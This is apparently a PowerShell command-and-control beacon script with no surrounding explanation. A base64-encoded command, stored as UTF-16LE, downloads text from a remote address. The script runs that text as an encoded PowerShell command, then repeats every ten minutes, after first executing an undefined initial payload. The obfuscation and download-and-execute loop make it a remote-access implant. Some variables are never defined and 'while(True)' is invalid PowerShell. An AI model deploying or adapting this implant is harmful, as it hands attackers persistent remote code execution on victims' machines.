$request_order = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAGIAYwApAA=="
function Drop-Sails{
    powershell -encodedcommand $init
}

function Request-Orders {    
    $order_raw = powershell -encodedcommand $request_order
    $order_b = [System.Text.Encoding]::Unicode.GetBytes($order_raw)
    $order_b64 = [Convert]::ToBase64String($order_b)
    return $order_b64
}

function Run-Orders { 
    $orders = Request-Orders
    powershell -encodedcommand $orders
}

Drop-Sails

while(True){
    Run-Orders
    sleep 600    
}